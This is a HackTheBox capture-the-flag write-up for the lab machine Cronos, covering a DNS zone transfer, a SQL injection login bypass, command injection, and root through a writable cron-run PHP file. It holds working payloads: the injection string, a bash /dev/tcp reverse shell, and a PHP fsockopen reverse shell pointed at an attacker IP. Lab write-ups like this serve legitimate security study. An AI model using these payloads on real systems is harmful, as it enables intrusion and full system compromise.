---
layout: post
title	HTB Write-Up: Cronos
Author: Pedro Pereira
date: 2024-11-11
categories: [HackTheBox, Medium, Linux]
tags: [DNS, ZoneTransfer, SQLi, CommandInjection, CronJob, Laravel, PHP]
---


# HackTheBox: Cronos

**Difficulty:** Medium  
**OS:** Linux  
**Topics:** DNS Zone Transfer, SQL Injection, Command Injection, Cron Job Privilege Escalation

---

## Summary

Cronos is a Linux machine that punishes anyone who skips DNS enumeration. The box name is literally a hint (Cronos, cron jobs) but before we even get there, port 53 being open is the real signal to pay attention to. A DNS zone transfer give us a hidden admin subdomain that otherwise would be super difficult to find. The admin panel falls to a one-liner SQL injection, the tool inside is vulnerable to command injection, and initial access lands as `www-data`. Privilege escalation is straightforward: a cron job runs as root every minute, executing a PHP file that `www-data` owns. We swap the file, wait sixty seconds, and that's the box.

---

## Enumeration

### Port Scanning

```bash
nmap -sC -sV -p- 10.10.10.13
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Three ports were find: 
- SSH on 22, 
- DNS on 53, 
- HTTP on 80. 

Port 80 seemed like nothing, just the Apache default page, which usually means we need to find a DNS name to add to our `/etc/hosts`.  Additionally, the port 53 gave us an hint that it probably is using DNS for something. Spoiler Alert: **it was**.

### Directory Enumeration

```bash
gobuster dir -u http://10.10.10.13 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

```
/.hta          (Status: 403)
/.htpasswd     (Status: 403)
/.htaccess     (Status: 403)
/index.html    (Status: 200)
/server-status (Status: 403)
```

Nothing useful, which makes complete sense in hindsight: scanning the bare IP when the real content is behind a virtual host is always going to come up empty. Worth running, but didn't spend too long here.

### DNS Enumeration

With port 53 open, the first move is adding `cronos.htb` to `/etc/hosts` and seeing if that changes anything...
...and It did!

<img width="1461" height="785" alt="image" src="https://github.com/user-attachments/assets/e8e76bbd-0745-4fba-8fd9-6cdf5a112562" />

Browsing to `http://cronos.htb/` now showed a proper website instead of the Apache default, confirming that what we were missing was the DNS name. Of course, this was a "guess", but attackers should try everything, it's a trial and error sometimes...

But the more interesting thing DNS can give us is a zone transfer. When misconfigured, a DNS server will happily hand over its entire record set to anyone who asks:

```bash
dig axfr @10.10.10.13 cronos.htb
```

<img width="891" height="262" alt="image" src="https://github.com/user-attachments/assets/2c476784-2a2b-4a2e-9856-07d5b95df7fd" />

It worked. Zone transfer succeeded and returned every DNS record for the domain, subdomains included. Among them: **admin.cronos.htb**.

No brute-forcing, no wordlists, just the server handing you its entire map. Added both hostnames to `/etc/hosts` and moved on.

You can also confirm the hostname directly:

```bash
nslookup 10.10.10.13 10.10.10.13
```

<img width="547" height="65" alt="image" src="https://github.com/user-attachments/assets/2269803b-cbb5-4c59-9dfe-652e37da9280" />

This would also give us an hint on the domain with no guessing needed :)

---

## Web Application Reconnaissance

### cronos.htb
<img width="1461" height="785" alt="image" src="https://github.com/user-attachments/assets/770dc590-398c-44d3-b132-418205ce0ced" />

The main site was Laravel-based. Following the Documentation link redirected to the Laravel docs, which confirmed the PHP framework. 

<img width="1122" height="890" alt="image" src="https://github.com/user-attachments/assets/cb0ed410-5728-4b2b-b2fd-fdbad7c52d4b" />

I did poked around, and was a little lost for a little bit, but there was really nothing to attack here. The interesting stuff was on the subdomain.

### admin.cronos.htb

Navigating to `admin.cronos.htb` showed a login form. No CAPTCHA. No rate limiting. No account lockout. Just a username and password field sitting there. The ideal conditions for injection testing.

<img width="1078" height="433" alt="image" src="https://github.com/user-attachments/assets/07e04197-2fcb-41ec-b169-4bd2a54f0c9e" />

---

## Exploitation: Initial Foothold

### SQL Injection: Authentication Bypass

First payload, first try:

```sql
admin'OR'1'='1
```

That dropped straight into the admin panel. It really was that simple... An SQL injection.. AFTER I LOST THAT MUCH TIME WITH THE WEBSITE!!!

### Command Injection: Reverse Shell

The admin panel contained what looked like a network diagnostic tool, a form that let you type in a host and choose between `ping` and `traceroute`, then showed you the output in the browser. A tool that takes user input and passes it to a shell command. I mean, come on... Command line injection? AFTER I LOS- okay I will calm down now...

<img width="598" height="293" alt="image" src="https://github.com/user-attachments/assets/c6d0dc4a-0eed-4ffc-9563-59e85f0d6440" />

I sent the request to Burp Suite's Repeater and chained a bash reverse shell onto the command:

```
command=traceroute;bash+-c+'bash+-i+>&+/dev/tcp/10.10.14.X/4444+0>&1'
```

<img width="1115" height="634" alt="image" src="https://github.com/user-attachments/assets/3372f808-be55-4187-8072-f12bbd7635c3" />

Listener ready on the other side:

```bash
nc -lvp 4444
```

Shell came back as `www-data`.

<img width="487" height="154" alt="image" src="https://github.com/user-attachments/assets/f0eeba45-86d1-4d72-a083-e08622877c64" />

---

## Post-Exploitation

### Digging Through the Database

While I had a shell as `www-data`, I dug through the web application files, and in the admin app's `config.php`, there it was, MySQL credentials sitting in plaintext.

<img width="574" height="155" alt="image" src="https://github.com/user-attachments/assets/5d751338-f7d4-4ace-b87f-ddb794d7b440" />

I connected to the database:
```bash
mysql -u admin -p
```

...And enumerate it a bit, finding an hash for DB admin
<img width="655" height="435" alt="image" src="https://github.com/user-attachments/assets/ecc67161-66f4-4948-82a9-59c9da48c658" />

The users table had an MD5 hash for the admin account. Running it through a cracker gave **1327663704**. 

These are the real login credentials for the admin panel, the ones you'd need without the SQL injection bypass, not critical for this chain, because I had already access to the admin user, but always worth documenting... After all, in the real world, that password is not strong enough.

Interesting enough, I also found a second database for the Laravel application, went through it looking for anything useful, and came up empty. Dead end. Moving on.

<img width="658" height="184" alt="image" src="https://github.com/user-attachments/assets/9a43fe04-3687-4510-9b42-25b43a49ac41" />

---

## Privilege Escalation

### Cron Job Abuse

Yes, I should have guess it by the box name... Give me a break! 

`/etc/crontab` should be one of the first things you check after getting a shell. Sometimes you get lucky:

```bash
cat /etc/crontab
```

<img width="826" height="281" alt="image" src="https://github.com/user-attachments/assets/6dc2957d-a1f3-4456-a3bc-3704b6435805" />

A job running as **root**, every single minute, executing a PHP file inside the Laravel web directory. The web directory, the one that belongs to `www-data`. The one we can write to.

I replaced the file contents with a PHP reverse shell:

```php
<?php
$sock = fsockopen("10.10.14.X", 1234);
$proc = proc_open('/bin/sh', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
?>
```

Set up the listener:

```bash
nc -lvp 1234
```

Then waited. Less than a minute later, root fired the cron job, executed our shell, and the connection came in. YAY I GUESS!

**Root flag:**

<img width="577" height="174" alt="image" src="https://github.com/user-attachments/assets/76e0370b-a08f-4cf3-8697-52d2b1501bca" />

---

## Vulnerability Summary

| Step | Vulnerability | Impact |
|---|---|---|
| Enumeration | DNS Zone Transfer (misconfigured BIND) | Hidden admin subdomain exposed |
| Initial Access | SQL Injection (auth bypass) + OS Command Injection | Remote Code Execution as www-data |
| Privilege Escalation | Cron job runs as root on a www-data-writable file | Full system compromise |
